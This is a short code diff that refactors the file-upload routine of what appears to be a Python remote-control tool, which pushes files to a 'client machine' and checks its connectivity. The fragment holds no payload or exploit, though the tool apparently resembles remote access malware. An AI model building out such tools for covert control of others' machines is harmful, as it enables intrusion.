@@ -77,15 +77,14 @@ def upload(cmd):
        else:
           controler.send(cmd.encode("UTF-8"))
           print("[~] Uploading [ {} ]...".format(filetoup))
-          wf = open(filetoup,"rb")
-          for data in wf:
-            try:
-              controler.send(data)
-            except(KeyboardInterrupt,EOFError):
-              wf.close()
-              controler.send(b":Aborted:")
-              print("[!] Uploading Has Been Aborted By User!\n")
-              return
+          with open(filetoup,"rb") as wf:
+            for data in iter(lambda: wf.read(4100), b""):
+              try:controler.send(data)
+              except(KeyboardInterrupt,EOFError):
+                wf.close()
+                controler.send(b":Aborted:")
+                print("[!] Uploading Has Been Aborted By User!\n")
+                return
           controler.send(b":DONE:")
           savedpath = controler.recv().decode("UTF-8")
           print("[*] Upload Complete :)\n[*] File uploaded in : "+str(savedpath).strip()+" in client machine\n")
@@ -96,6 +95,7 @@ def check_con():
      status = controler.recv().decode("UTF-8").strip()
      if status == "UP": print("[*] client: Connected to internet !\n")
      else: print("[!] client: Not Connected to internet !\n")
+
 def browse(cmd):
   url = "".join(cmd.split(":browse")).strip()
   if not url.strip(): print("Usage: :browse <Websute_URL>\n")
